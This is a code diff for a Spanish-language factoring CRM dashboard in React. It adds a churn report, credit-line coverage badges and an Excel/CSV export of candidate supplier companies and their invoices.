+    let total = 0, cedido = 0;
+    for (const f of fs) {
+      total += f.monto; if (f.cedido === "Sí") cedido += f.monto;
+      filasFact.push([c.rut, c.razonSocial, f.mes, f.tipo, f.folio, f.fecha, f.monto, f.estado, f.nc, f.cedido, f.cesRut, f.cesNombre]);
+    }
+    filasEmp.push([c.rut, c.razonSocial, [...new Set(c.clientes)].join(" · "), fs.length, total, cedido, total ? Math.round(cedido / total * 100) : 0, c.ultimaFactura]);
+  }
+  const nombreArchivo = `empresas_candidatas_${ancla}`;
+  try {
+    const XLSX = await cargarXLSX();
+    const wb = XLSX.utils.book_new();
+    XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(filasFact.map(filaSegura)), "Facturas");
+    XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(filasEmp.map(filaSegura)), "Empresas");
+    XLSX.writeFile(wb, nombreArchivo + ".xlsx");
+  } catch (e) {
+    // Sin SheetJS se baja el detalle en CSV con BOM, que Excel abre igual.
+    const esc = (v) => `"${String(celdaSegura(v)).replace(/"/g, '""')}"`;
+    const csv = String.fromCharCode(0xFEFF) + filasFact.map((r) => r.map(esc).join(";")).join("\n");
+    const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a"); a.href = url; a.download = nombreArchivo + ".csv";
+    document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
+  }
+  logSys("info", "app", `Exportadas ${cands.length} empresas candidatas (${filasFact.length - 1} facturas de 6 meses)`, { candidatas: cands.length, facturas: filasFact.length - 1, ancla });
+  registrarAuditoria({ usuario: usuarioNombre, modulo: "Dashboard", accion: "Exportar", glosa: `Descargó el detalle de ${cands.length} empresas candidatas (${filasFact.length - 1} facturas, últimos 6 meses)`, exito: true });
+  return { empresas: cands.length, facturas: filasFact.length - 1 };
+}
 function dashboardKPIs(usuario, deals) {
   const soloExec = EXECS[usuario] || null;                                  // nombre del ejecutivo, o null (jefe/gerencia/admin → todo)
   const execScope = EXECS[usuario] ? [usuario] : (JEFE_A_EXECS[usuario] || null); // códigos visibles, o null = todos
@@ -10331,6 +12228,18 @@ function dashboardKPIs(usuario, deals) {
   const inactivas = mis.filter((c) => c.estado === "Inactivo").length;
   const activas = total - inactivas;
   const operanOtros = mis.filter((c) => c.estado === "Competencia").length;
+  const churn = churnResumen(churnCartera(soloExec)); // «operan con otros», abierto por segmento
+  // Cobertura de línea de las empresas ACTIVAS: sin línea aprobada no pueden cursar, y una línea
+  // insuficiente frena el SOW. Misma fuente que el menú Líneas (LINEAS_DATA + lineaRecomendacion),
+  // para que los números no se separen entre pantallas.
+  const lineasPorRut = lineaIdxPorRut() || new Map();
+  const lineas = mis.reduce((a, c) => {
+    const l = lineasPorRut.get(c.rut);
+    if (!l) { a.sin++; return a; }
+    a.con++;
+    if (lineaRecomendacion(l).tipo === "Aumentar línea") a.aumentar++;
+    return a;
+  }, { con: 0, sin: 0, aumentar: 0 });
   // ── Empresas candidatas = PROVEEDORES DE LOS CLIENTES que todavía no operan con nosotros ─────────
   // Antes esto contaba clientes propios marcados FUGA/CAÍDA, o sea cartera A RECUPERAR. Eso no es un
   // candidato: es un cliente que ya tenemos y se está yendo (y ya se mide en «operan con otros»).
@@ -10339,18 +12248,10 @@ function dashboardKPIs(usuario, deals) {
   // Fuente: feed diario PROVEEDORES_CLIENTES (top 10 proveedores por cliente). Se cuentan proveedores
   // DISTINTOS —un mismo proveedor puede venderle a varios clientes de la cartera y es un solo
   // prospecto— y se excluyen los que ya están en el maestro de empresas.
-  const candidatas = (() => {
-    const feed = (typeof window !== "undefined" && window.PROVEEDORES_CLIENTES) || null;
-    if (!feed || !Array.isArray(feed.clientes)) return 0; // sin feed no se inventa el número: es 0 y queda en el log
-    const rutsCartera = new Set(mis.map((c) => c.rut));            // clientes del ejecutivo (alcance)
-    const rutsMaestro = new Set(PC_CLIENTES.map((c) => c.rut));    // universo de empresas ya conocidas
-    const prospectos = new Set();
-    for (const cli of feed.clientes) {
-      if (!rutsCartera.has(cli.rut)) continue;
-      for (const p of (cli.proveedores || [])) if (!rutsMaestro.has(p.rut)) prospectos.add(p.rut);
-    }
-    return prospectos.size;
-  })();
+  const candLista = candidatasDeCartera(soloExec); // sin feed la lista viene vacía: 0, y queda en el log
+  const candidatas = candLista.length;
+  // Tramo de facturación a NUESTROS clientes: es el criterio para decidir a quién llamar primero.
+  const candTramo = { m50: candLista.filter((c) => c.montoMM > 50).length, m100: candLista.filter((c) => c.montoMM > 100).length };
   const nuevasMes = inis.reduce((s, ini) => s + nuevasEmpRealMes(ini, MES_ACT), 0);
   // ── Rango "mes en curso" + últimas 8 semanas (SHARE_OF_WALLET) ──
   const semanas = [...new Set((window.SHARE_OF_WALLET || []).flatMap((s) => (s.HistoricoSemanal || []).map((w) => w.Semana)))].sort();
@@ -10428,7 +12329,7 @@ function dashboardKPIs(usuario, deals) {
   const msgResponder = notifSolic(usuario).porResponder.length;
   return {
     nombre: soloExec || "Todos los ejecutivos",
-    empresas: { total, activas, inactivas, operanOtros, candidatas, nuevasMes, ops: kpi.ops },
+    empresas: { total, activas, inactivas, operanOtros, candidatas, candTramo, nuevasMes, ops: kpi.ops }, churn, lineas,
     operaciones: kpi, sowPrimePct, serieSem,
     metas: { colocReal, colocMeta, nvReal: nuevasMes, nvMeta, opReal: activas, opMeta: total, sowReal: kpi.sowPct, sowPrimeReal: sowPrimePct, targetProm, compTargetReal: compTargetPrimePct, compTargetMeta: Math.max(1, Math.round((100 - targetProm) * 0.5)) },
     tareas: { lineasGest, nLineasSOW, nFueraLinea, prioritarios, nTubo, tareasPend, msgResponder },
@@ -10437,14 +12338,14 @@ function dashboardKPIs(usuario, deals) {
 // `tag` tipifica la meta (Colocaciones · Clientes · Principalidad · SOW General · SOW Prime · SOW
 // Competencia). Va arriba de todo, alineada a la izquierda sobre el ícono, en gris neutro: agrupa las
 // cards por familia sin competir con el dato, que es lo que el ejecutivo tiene que leer primero.
-function DashCard({ Icon, col, valor, label, sub, serie, meta, onClick, tag }) {
+function DashCard({ Icon, col, valor, label, sub, serie, meta, onClick, tag, hint }) {
   const clickable = typeof onClick === "function";
   return (
     // Columna flex de alto completo: la grilla ya iguala la altura de las cards, pero sin esto el
     // contenido queda arriba y la barra de cumplimiento aparece a distinta altura en cada una (el valor
     // de «Colocaciones» envuelve a dos líneas y corre todo lo de abajo). El bloque de meta se ancla al
     // fondo con marginTop:auto, así las barras quedan alineadas en toda la fila.
-    <div onClick={clickable ? onClick : undefined} title={clickable ? "Ver en el Tubo diario" : undefined} className="rounded-2xl bg-white p-4 transition-shadow" style={{ border: `1px solid ${C.line}`, cursor: clickable ? "pointer" : "default", boxShadow: clickable ? "0 1px 2px rgba(20,25,45,.04)" : "none", display: "flex", flexDirection: "column", height: "100%" }} onMouseEnter={clickable ? (e) => { e.currentTarget.style.boxShadow = `0 0 0 1.5px ${col}, 0 6px 18px ${col}22`; } : undefined} onMouseLeave={clickable ? (e) => { e.currentTarget.style.boxShadow = "0 1px 2px rgba(20,25,45,.04)"; } : undefined}>
+    <div onClick={clickable ? onClick : undefined} title={clickable ? (hint || "Ver el detalle") : undefined} className="rounded-2xl bg-white p-4 transition-shadow" style={{ border: `1px solid ${C.line}`, cursor: clickable ? "pointer" : "default", boxShadow: clickable ? "0 1px 2px rgba(20,25,45,.04)" : "none", display: "flex", flexDirection: "column", height: "100%" }} onMouseEnter={clickable ? (e) => { e.currentTarget.style.boxShadow = `0 0 0 1.5px ${col}, 0 6px 18px ${col}22`; } : undefined} onMouseLeave={clickable ? (e) => { e.currentTarget.style.boxShadow = "0 1px 2px rgba(20,25,45,.04)"; } : undefined}>
       {/* Altura fija y sin salto de línea: si una etiqueta larga («SOW Competencia») envuelve, esa card
           crece y la fila entera se desalinea. Se recorta con elipsis antes que descuadrar la grilla. */}
       {tag && <div className="mb-1.5 t9 font-semibold uppercase" style={{ color: C.faint, letterSpacing: ".04em", height: 13, lineHeight: "13px", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>{tag}</div>}
@@ -10468,7 +12369,7 @@ function DashCard({ Icon, col, valor, label, sub, serie, meta, onClick, tag }) {
         const cumpl = meta.invert
           ? Math.min(100, Math.round((meta.objetivo / Math.max(meta.real, 0.01)) * 100))
           : meta.pct;
-        const col = meta.invert ? (excedido ? "#DC2626" : "#16A34A") : dashCumplCol(cumpl);
+        const col = meta.invert ? (excedido ? "#EF4444" : "#16A34A") : dashCumplCol(cumpl);
         return (
         <div style={{ marginTop: "auto", paddingTop: 8 }}>
           <div className="flex items-center justify-between t9">
@@ -10482,8 +12383,160 @@ function DashCard({ Icon, col, valor, label, sub, serie, meta, onClick, tag }) {
     </div>
   );
 }
-function DashboardView({ usuario, deals, onVerPrioritarios }) {
+// ============================================================
+// REPORTE CHURN (Gestión) — a dónde se va el factoring de mi cartera
+// ============================================================
+// Responde tres preguntas en una pantalla: cuánto me cede la cartera, cuánto se va a otros factoring
+// (y cuánto de eso al factoring TARGET, que es contra quien competimos), y cómo viene evolucionando el
+// SOW. El listado está segmentado porque la acción comercial es distinta en cada caso.
+function ReporteChurn({ soloExec }) {
+  const [seg, setSeg] = useState("todos");
+  const [q, setQ] = useState("");
+  const lista = useMemo(() => churnCartera(soloExec), [soloExec]);
+  const serie = useMemo(() => churnSerieSemanal(lista), [lista]);
+  const res = churnResumen(lista);
+  const tot = lista.reduce((a, c) => ({ bice: a.bice + c.biceMM, otros: a.otros + c.otrosMM, target: a.target + c.targetMM, resto: a.resto + c.restoMM }), { bice: 0, otros: 0, target: 0, resto: 0 });
+  const sowFin = serie.length ? serie[serie.length - 1].sow : 0;
+  const sowIni = serie.length ? serie[0].sow : 0;
+  const dSow = +(sowFin - sowIni).toFixed(1);
+  const rows = lista.filter((c) => (seg === "todos" || c.segmento === seg) && (!q || c.cliente.toLowerCase().includes(q.toLowerCase()) || (c.rut || "").includes(q)));
+  const kpis = [
+    { t: "Cede a Security", v: fmtMM(tot.bice), s: "últimas 8 semanas · lo que sí capturo", col: "#16A34A", bg: C.greenBg, bd: "#bbf7d0" },
+    { t: "Cede a otros factoring", v: fmtMM(tot.otros), s: `${(tot.bice + tot.otros) ? Math.round(tot.otros / (tot.bice + tot.otros) * 100) : 0}% del wallet de estas empresas`, col: "#EF4444", bg: C.redBg, bd: "#fecaca" },
+    { t: "Al factoring target", v: fmtMM(tot.target), s: `de lo anterior · ${fmtMM(tot.resto)} al resto del mercado`, col: "#C2410C", bg: C.amberBg, bd: "#FED7AA" },
+    { t: "SOW de estas empresas", v: `${sowFin}%`, s: `${dSow >= 0 ? "+" : ""}${dSow} pts vs ${serie.length ? wkLbl(serie[0].sem) : "—"}`, col: dSow < 0 ? "#EF4444" : "#703EFF", bg: dSow < 0 ? C.redBg : "#f5f3ff", bd: dSow < 0 ? "#fecaca" : "#ddd6fe" },
+  ];
+  // Gráfico: barra apilada por semana (lo mío abajo, lo de otros arriba) + línea del SOW sobre eje derecho.
+  const W = 760, H = 200, PL = 48, PR = 40, PT = 12, PB = 28;
+  const maxTot = Math.max(1, ...serie.map((x) => x.total));
+  const bw = serie.length ? (W - PL - PR) / serie.length : 0;
+  const alto = (v) => (v / maxTot) * (H - PT - PB);
+  const ySow = (pct) => H - PB - (pct / 100) * (H - PT - PB);
+  const ptsSow = serie.map((x, i) => `${(PL + i * bw + bw / 2).toFixed(1)},${ySow(x.sow).toFixed(1)}`).join(" ");
+  return (
+    <div className="space-y-4">
+      <div>
+        <div className="text-lg font-bold" style={{ color: C.ink }}>Churn · a dónde se va el factoring de la cartera</div>
+        <div className="t12" style={{ color: C.faint }}>
+          Empresas del alcance que ceden facturas a <b>otro factoring</b>. Montos de las últimas 8 semanas (serie SOW) y reparto por
+          cesionario según AECSync. {soloExec ? `Cartera de ${soloExec}.` : "Todas las carteras."}
+        </div>
+      </div>
+      <div className="grid grid-cols-2 gap-2 md:grid-cols-4">
+        {kpis.map((k, i) => (
+          <div key={i} className="rounded-xl p-3" style={{ backgroundColor: k.bg, border: `1px solid ${k.bd}` }}>
+            <div className="t9 font-bold uppercase tracking-wide" style={{ color: k.col }}>{k.t}</div>
+            <div className="text-xl font-bold" style={{ color: k.col }}>{k.v}</div>
+            <div className="mt-0.5 t9" style={{ color: C.faint }}>{k.s}</div>
+          </div>
+        ))}
+      </div>
+      {/* Evolución: el monto total de la barra es el wallet de la semana; el tramo morado es lo que capté. */}
+      <div className="rounded-2xl bg-white p-4" style={{ border: `1px solid ${C.line}` }}>
+        <div className="flex flex-wrap items-center justify-between gap-2">
+          <div className="t12 font-semibold" style={{ color: C.ink }}>Evolución semanal del wallet y del SOW</div>
+          <div className="flex items-center gap-3 t9" style={{ color: C.sub }}>
+            <span className="flex items-center gap-1"><span className="h-2.5 w-2.5 rounded-sm" style={{ backgroundColor: C.indigo }} /> Cedido a Security</span>
+            <span className="flex items-center gap-1"><span className="h-2.5 w-2.5 rounded-sm" style={{ backgroundColor: "#FCA5A5" }} /> Cedido a otros</span>
+            <span className="flex items-center gap-1"><span className="h-0.5 w-4" style={{ backgroundColor: C.navy }} /> SOW %</span>
+          </div>
+        </div>
+        {serie.length === 0 ? (
+          <div className="py-10 text-center t11" style={{ color: C.faint }}>Sin serie semanal para este alcance.</div>
+        ) : (
+        <svg viewBox={`0 0 ${W} ${H}`} className="mt-2 w-full" style={{ display: "block" }}>
+          {[0, 25, 50, 75, 100].map((g) => (
+            <g key={g}>
+              <line x1={PL} x2={W - PR} y1={ySow(g)} y2={ySow(g)} stroke={C.line} strokeWidth={1} />
+              <text x={W - PR + 5} y={ySow(g) + 3} fontSize={9} fill={C.faint}>{g}%</text>
+            </g>
+          ))}
+          <text x={4} y={PT + 8} fontSize={9} fill={C.faint}>{fmtMM(maxTot)}</text>
+          {serie.map((x, i) => {
+            const hb = alto(x.bice), ho = alto(x.otros);
+            const bx = PL + i * bw + bw * 0.18, bwr = Math.max(2, bw * 0.64);
+            return (
+              <g key={x.sem}>
+                <title>{`${wkLbl(x.sem)} · Security ${fmtMM(x.bice)} · otros ${fmtMM(x.otros)} · SOW ${x.sow}%`}</title>
+                <rect x={bx} y={H - PB - ho - hb} width={bwr} height={Math.max(0, ho)} fill="#FCA5A5" />
+                <rect x={bx} y={H - PB - hb} width={bwr} height={Math.max(0, hb)} fill={C.indigo} />
+                {(i % Math.ceil(serie.length / 8) === 0 || i === serie.length - 1) && (
+                  <text x={bx + bwr / 2} y={H - PB + 12} fontSize={9} fill={C.faint} textAnchor="middle">{wkLbl(x.sem)}</text>
+                )}
+              </g>
+            );
+          })}
+          <polyline points={ptsSow} fill="none" stroke={C.navy} strokeWidth={2} strokeLinejoin="round" strokeLinecap="round" />
+          {serie.map((x, i) => <circle key={"p" + x.sem} cx={PL + i * bw + bw / 2} cy={ySow(x.sow)} r={2.4} fill={C.navy} />)}
+        </svg>
+        )}
+      </div>
+      {/* Segmentos: cada uno tiene una acción comercial distinta, por eso son el filtro del listado. */}
+      <div className="grid grid-cols-1 gap-2 sm:grid-cols-3">
+        {["soloOtros", "compartida", "perdiendo"].map((k) => { const m = CHURN_SEG[k]; const n = k === "soloOtros" ? res.soloOtros : k === "perdiendo" ? res.perdiendo : (res.compartidas - res.perdiendo); const on = seg === k; return (
+          <button key={k} onClick={() => setSeg(on ? "todos" : k)} className="rounded-xl p-3 text-left" style={{ backgroundColor: m.bg, border: `1px solid ${on ? m.c : "transparent"}`, boxShadow: on ? `0 0 0 1.5px ${m.c}` : "none" }}>
+            <div className="t9 font-bold uppercase tracking-wide" style={{ color: m.c }}>{m.l}</div>
+            <div className="text-xl font-bold" style={{ color: m.c }}>{n}</div>
+            <div className="mt-0.5 t9" style={{ color: C.sub, lineHeight: 1.35 }}>{m.d}</div>
+          </button>
+        ); })}
+      </div>
+      <div className="flex flex-wrap items-center justify-between gap-2">
+        <div className="flex items-center gap-1.5 rounded-full px-3 py-1.5" style={{ border: `1px solid ${C.line}`, backgroundColor: "#fff" }}>
+          <Search size={13} style={{ color: C.faint }} />
+          <input value={q} onChange={(e) => setQ(e.target.value)} placeholder="Buscar empresa o RUT…" className="w-60 bg-transparent t12 outline-none" style={{ color: C.ink }} />
+        </div>
+        <div className="t10" style={{ color: C.faint }}>{rows.length} de {lista.length} empresas{seg !== "todos" && <> · <button onClick={() => setSeg("todos")} className="font-semibold" style={{ color: C.indigo }}>ver todas</button></>}</div>
+      </div>
+      <div className="overflow-x-auto rounded-2xl" style={{ backgroundColor: "#fff", border: `1px solid ${C.line}` }}>
+        <table className="w-full border-collapse t11" style={{ minWidth: "1040px" }}>
+          <thead><tr>{["Empresa", "Segmento", "Cede a Security", "Cede a otros", "Al factoring target", "SOW", "Se lo lleva"].map((h) => (
+            <th key={h} className="px-3 py-2.5 text-left t9 font-bold uppercase tracking-wide" style={{ color: C.faint, borderBottom: `1px solid ${C.line}` }}>{h}</th>
+          ))}</tr></thead>
+          <tbody>
+            {rows.map((c) => { const m = CHURN_SEG[c.segmento]; const top = c.comp.slice(0, 2); return (
+              <tr key={c.rut} style={{ borderBottom: `1px solid ${C.line}` }}>
+                <td className="px-3 py-2.5"><div className="t12 font-medium" style={{ color: C.ink }}>{c.cliente}</div><div className="t9" style={{ color: C.faint }}>{c.rut} · {c.exec}</div></td>
+                <td className="whitespace-nowrap px-3 py-2.5"><span className="rounded-full px-2 py-0.5 t10 font-bold" style={{ backgroundColor: m.bg, color: m.c }}>{m.l}</span></td>
+                <td className="whitespace-nowrap px-3 py-2.5 t11 font-semibold" style={{ color: c.biceMM > 0 ? "#16A34A" : C.faint }}>{c.biceMM > 0 ? fmtMM(c.biceMM) : "—"}</td>
+                <td className="whitespace-nowrap px-3 py-2.5 t11 font-semibold" style={{ color: "#EF4444" }}>{fmtMM(c.otrosMM)}</td>
+                <td className="whitespace-nowrap px-3 py-2.5 t11" style={{ color: c.targetMM > 0 ? "#C2410C" : C.faint }}>{c.targetMM > 0 ? fmtMM(c.targetMM) : "—"}</td>
+                <td className="whitespace-nowrap px-3 py-2.5">
+                  <div className="t11 font-semibold" style={{ color: C.ink }}>{c.sowAct}% <span className="t9 font-normal" style={{ color: C.faint }}>/ {c.sowTarget}% target</span></div>
+                  <div className="t9 font-semibold" style={{ color: c.delta < 0 ? "#EF4444" : c.delta > 0 ? "#16A34A" : C.faint }}>{c.delta > 0 ? "+" : ""}{c.delta} pts · {c.tendencia}</div>
+                </td>
+                <td className="px-3 py-2.5 t10" style={{ color: C.sub, maxWidth: 240 }}>{top.length ? top.map((x) => `${x.name} (${x.pct}%)`).join(" · ") : <span style={{ color: C.faint }}>Sin detalle AECSync</span>}</td>
+              </tr>
+            ); })}
+            {rows.length === 0 && <tr><td colSpan={7} className="px-3 py-8 text-center t11" style={{ color: C.faint }}>Sin empresas para el filtro.</td></tr>}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  );
+}
+// Tag + badge: la etiqueta dice QUÉ y el badge CUÁNTO. Fuera de DashboardView por lo mismo que CfgCampo:
+// definido adentro, cada render remontaba el dashboard completo (sparklines incluidos) en vez de
+// actualizarlo. Ninguno de los dos cierra sobre estado del componente.
+function TagBadge({ label, n, title, bg = "#F3F4F6", fg = C.sub, badgeBg = "#E5E7EB", badgeFg = C.ink }) {
+  return (
+    <span title={title} className="inline-flex items-center gap-1 rounded-full py-0.5 pl-2 pr-1 t9 font-medium" style={{ backgroundColor: bg, color: fg }}>
+      {label}
+      <span className="rounded-full px-1.5 t7 font-bold" style={{ backgroundColor: badgeBg, color: badgeFg, minWidth: 16, textAlign: "center" }}>{n}</span>
+    </span>
+  );
+}
+function Section({ title, children }) {
+  return (
+    <div>
+      <div className="mb-2 t9 font-bold uppercase tracking-widest" style={{ color: C.faint }}>{title}</div>
+      <div className="grid grid-cols-1 gap-3 sm:grid-cols-2 md:grid-cols-3 xl:grid-cols-6">{children}</div>
+    </div>
+  );
+}
+function DashboardView({ usuario, deals, onVerTareas, onVerClientes, onVerChurn }) {
   const [tick, setTick] = useState(0);
+  const [bajando, setBajando] = useState(false); // descarga del Excel de candidatas en curso
   // Siembra (una vez) prioridades + tareas asignadas de demo para que los indicadores de «Tareas» tengan datos.
   useEffect(() => { seedTareasDemo(deals, EXECS[usuario] || "todos"); setTick((t) => t + 1); }, []); // eslint-disable-line
   const d = useMemo(() => dashboardKPIs(usuario, deals), [usuario, deals, tick]);
@@ -10491,32 +12544,59 @@ function DashboardView({ usuario, deals, onVerPrioritarios }) {
   const sow = Math.round(o.sowPct), sowPrime = Math.round(d.sowPrimePct);
   const pct = (real, meta) => meta > 0 ? Math.round(real / meta * 100) : 0;
   const emp = d.empresas;
-  const Section = ({ title, children }) => (
-    <div>
-      <div className="mb-2 t9 font-bold uppercase tracking-widest" style={{ color: C.faint }}>{title}</div>
-      <div className="grid grid-cols-1 gap-3 sm:grid-cols-2 md:grid-cols-3 xl:grid-cols-6">{children}</div>
-    </div>
-  );
   return (
     <div className="space-y-6">
       <Section title="Empresas">
-        <DashCard Icon={User} col="#703EFF" valor={emp.total.toLocaleString("es-CL")} label="Empresas · cartera" sub="Clientes asignados a tu cartera" serie={dashSerie(emp.total, "emp-total-" + usuario)} />
-        <DashCard Icon={Check} col="#16A34A" valor={emp.activas.toLocaleString("es-CL")} label="Empresas activas" sub={`${emp.ops.toLocaleString("es-CL")} operaciones (este mes)`} serie={dashSerie(emp.activas, "emp-act-" + usuario)} />
-        <DashCard Icon={ArrowDownRight} col="#C2410C" valor={emp.operanOtros.toLocaleString("es-CL")} label="Operan con otros" sub="ceden a otros factorings" serie={dashSerie(emp.operanOtros, "emp-otr-" + usuario)} />
-        <DashCard Icon={Star} col="#7C3AED" valor={emp.candidatas.toLocaleString("es-CL")} label="Empresas candidatas" sub="proveedores de clientes" serie={dashSerie(emp.candidatas, "emp-can-" + usuario)} />
+        {/* Las tres primeras aterrizan en Clientes con el mismo corte que muestra la card. */}
+        <DashCard Icon={User} col="#703EFF" valor={emp.total.toLocaleString("es-CL")} label="Empresas · cartera" sub="Clientes asignados a tu cartera" serie={dashSerie(emp.total, "emp-total-" + usuario)} onClick={() => onVerClientes && onVerClientes("todos")} hint="Ver las empresas de tu cartera en Clientes" />
+        {/* Cobertura de línea: sin línea aprobada la empresa no puede cursar, y la que necesita
+            ampliarla tiene facturas de buenos deudores sin financiar — es freno directo del SOW. */}
+        <DashCard Icon={Check} col="#16A34A" valor={emp.activas.toLocaleString("es-CL")} label="Empresas activas"
+          sub={<span className="block">
+            <span className="block">{emp.ops.toLocaleString("es-CL")} operaciones (este mes)</span>
+            <span className="mt-1 flex flex-wrap items-center gap-1">
+              <TagBadge label="Con línea" n={d.lineas.con} title={`De las ${emp.total} empresas de tu cartera, ${d.lineas.con} tienen línea de crédito aprobada`} />
+              <TagBadge label="Sin línea" n={d.lineas.sin} title={`${d.lineas.sin} empresas de tu cartera no tienen línea aprobada: no pueden cursar hasta presentarla al comité`} />
+              <TagBadge label="Aumentar línea" n={d.lineas.aumentar} title="Líneas con facturas de buenos deudores sin financiar por límite insuficiente: frenan el SOW" bg={C.amberBg} fg="#C2410C" badgeBg="#C2410C" badgeFg="#fff" />
+            </span>
+          </span>}
+          serie={dashSerie(emp.activas, "emp-act-" + usuario)} onClick={() => onVerClientes && onVerClientes("activa")} hint="Ver las empresas activas en Clientes" />
+        {/* «Operan con otros» abierto por segmento: no es lo mismo la que no me cede nada que la que me
+            cede y se está yendo. El clic lleva al reporte Churn (Gestión), que es donde están los montos. */}
+        <DashCard Icon={ArrowDownRight} col="#C2410C" valor={d.churn.total.toLocaleString("es-CL")} label="Operan con otros"
+          sub={<span className="flex flex-wrap items-center gap-1">
+            {/* Los dos primeros son ESTADOS de la cartera y van en gris; el color se reserva para el
+                segmento que se está yendo ahora, que es lo único que debe saltar a la vista acá. */}
+            <TagBadge label="Sólo otros" n={d.churn.soloOtros} />
+            <TagBadge label="Compartidas" n={d.churn.compartidas - d.churn.perdiendo} />
+            <TagBadge label="Perdiendo SOW" n={d.churn.perdiendo} bg={CHURN_SEG.perdiendo.bg} fg={CHURN_SEG.perdiendo.c} badgeBg={CHURN_SEG.perdiendo.c} badgeFg="#fff" />
+          </span>}
+          serie={dashSerie(d.churn.total, "emp-otr-" + usuario)} onClick={() => onVerChurn && onVerChurn()} hint="Ver el reporte Churn en Gestión" />
+        {/* Candidatas NO están en Clientes (todavía no son empresas nuestras): lo accionable es el
+            listado para prospectar, así que la card descarga el Excel con el detalle de facturas. */}
+        <DashCard Icon={Star} col="#7C3AED" valor={emp.candidatas.toLocaleString("es-CL")} label="Empresas candidatas" sub={<span className="block">
+            <span className="block">{bajando ? "generando el Excel…" : "proveedores de clientes · descargar Excel"}</span>
+            <span className="mt-1 flex flex-wrap items-center gap-1">
+              <TagBadge label="Facturan > $50M" n={emp.candTramo.m50} title="Candidatas que le facturan más de $50 millones a clientes de la cartera" />
+              <TagBadge label="> $100M" n={emp.candTramo.m100} title="Candidatas que le facturan más de $100 millones a clientes de la cartera" />
+            </span>
+          </span>} serie={dashSerie(emp.candidatas, "emp-can-" + usuario)}
+          hint="Descargar el detalle de facturas de los últimos 6 meses (Excel)"
+          onClick={bajando || !emp.candidatas ? undefined : async () => { setBajando(true); try { await exportarCandidatasXlsx(EXECS[usuario] || null, USERS[usuario] || usuario); } finally { setBajando(false); } }} />
       </Section>
       <Section title="Operaciones · mes en curso">
         <DashCard Icon={BarChart2} col="#2563EB" valor={fmtMMc(o.facturado)} label="Facturas emitidas" sub={`${fmtMMc(o.facturadoBuenas)} · ${o.buenasPct}% de buenos deudores`} serie={d.serieSem.map((x) => x.facturado)} />
         <DashCard Icon={BarChart2} col="#7C3AED" valor={<>{fmtMMc(o.cedido)} <span className="t10 font-normal" style={{ color: C.faint }}>({o.cedidoPct}%)</span></>} label="Total cedido" sub={`${fmtMMc(o.buenasMM)} de buenos deudores`} serie={d.serieSem.map((x) => x.cedido)} />
         <DashCard Icon={Check} col="#16A34A" valor={fmtMMc(o.ganado)} label="Cedido a Security" sub={`SOW ${sow}%`} serie={d.serieSem.map((x) => x.ganado)} />
-        <DashCard Icon={ArrowDownRight} col="#DC2626" valor={fmtMMc(o.perdido)} label="Cedido a otros factoring" sub={`${fmtMMc(o.perdBanco)} a factoring target · ${fmtMMc(o.perdOtros)} otros`} serie={d.serieSem.map((x) => x.perdido)} />
+        <DashCard Icon={ArrowDownRight} col="#EF4444" valor={fmtMMc(o.perdido)} label="Cedido a otros factoring" sub={`${fmtMMc(o.perdBanco)} a factoring target · ${fmtMMc(o.perdOtros)} otros`} serie={d.serieSem.map((x) => x.perdido)} />
         <DashCard Icon={Target} col="#2563EB" valor={`${sow}%`} label="SOW" sub={`${sowPrime}% en deudores prime`} serie={d.serieSem.map((x) => x.sowPct)} />
       </Section>
       <Section title="Tareas">
-        <DashCard Icon={Star} col="#7C3AED" valor={t.prioritarios.toLocaleString("es-CL")} label="Negocios prioritarios" sub={`de ${t.nTubo.toLocaleString("es-CL")} negocios en el tubo`} onClick={t.prioritarios > 0 ? onVerPrioritarios : undefined} />
-        <DashCard Icon={AlertTriangle} col="#C2410C" valor={t.lineasGest.toLocaleString("es-CL")} label="Líneas por gestionar" sub="requeridos para aprobar negocios" />
-        <DashCard Icon={ClipboardList} col="#2563EB" valor={t.tareasPend.toLocaleString("es-CL")} label="Acciones pendientes" sub="asociadas a tus clientes" />
-        <DashCard Icon={Bell} col="#703EFF" valor={t.msgResponder.toLocaleString("es-CL")} label="Mensajes en tu bandeja" sub="enviados por tus compañeros" />
+        {/* Cada card de Tareas abre el menú Tareas ya filtrado por ese tipo de ítem. */}
+        <DashCard Icon={Star} col="#7C3AED" valor={t.prioritarios.toLocaleString("es-CL")} label="Negocios prioritarios" sub={`de ${t.nTubo.toLocaleString("es-CL")} negocios en el tubo`} onClick={() => onVerTareas && onVerTareas("prio")} hint="Ver las prioridades en Tareas" />
+        <DashCard Icon={AlertTriangle} col="#C2410C" valor={t.lineasGest.toLocaleString("es-CL")} label="Líneas por gestionar" sub="requeridos para aprobar negocios" onClick={() => onVerTareas && onVerTareas("linea")} hint="Ver las líneas por gestionar en Tareas" />
+        <DashCard Icon={ClipboardList} col="#2563EB" valor={t.tareasPend.toLocaleString("es-CL")} label="Acciones pendientes" sub="asociadas a tus clientes" onClick={() => onVerTareas && onVerTareas("task")} hint="Ver las tareas asignadas en Tareas" />
+        <DashCard Icon={Bell} col="#703EFF" valor={t.msgResponder.toLocaleString("es-CL")} label="Mensajes en tu bandeja" sub="enviados por tus compañeros" onClick={() => onVerTareas && onVerTareas("mensajes")} hint="Abrir la bandeja de requerimientos" />
       </Section>
       <Section title="Metas del mes">
         <DashCard Icon={Zap} col="#703EFF" tag="Colocaciones" valor={<>{fmtMMc(m.colocReal)} <span className="t10 font-normal" style={{ color: C.faint }}>/ {fmtMMc(m.colocMeta)}</span></>} label="" meta={{ pct: pct(m.colocReal, m.colocMeta) }} serie={dashSerie(m.colocReal, "meta-coloc-" + usuario)} />
@@ -10524,7 +12604,7 @@ function DashboardView({ usuario, deals, onVerPrioritarios }) {
         <DashCard Icon={User} col="#16A34A" tag="Principalidad" valor={<>{m.opReal} <span className="t10 font-normal" style={{ color: C.faint }}>/ {m.opMeta}</span></>} label="Clientes operando" meta={{ pct: pct(m.opReal, m.opMeta) }} serie={dashSerie(m.opReal, "meta-op-" + usuario)} />
         <DashCard Icon={Target} col="#7C3AED" tag="SOW General" valor={<>{sow}% <span className="t10 font-normal" style={{ color: C.faint }}>/ {m.targetProm}%</span></>} label="SOW total" meta={{ pct: pct(m.sowReal, m.targetProm) }} serie={d.serieSem.map((x) => x.sowPct)} />
